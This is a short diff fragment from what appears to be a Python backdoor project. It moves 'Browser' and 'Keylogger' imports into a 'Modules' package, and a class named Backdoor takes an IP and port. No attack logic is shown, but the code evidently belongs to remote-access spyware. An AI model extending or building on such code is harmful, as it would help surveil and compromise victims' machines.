@@ -7,8 +7,8 @@ import pyautogui
 import tempfile
 import keyboard
 import sys
-from Browser import browser
-from Keylogger import keylogger
+from Modules.Browser import browser
+from Modules.Keylogger import keylogger
 
 class Backdoor:
     def __init__(self,ip,port):
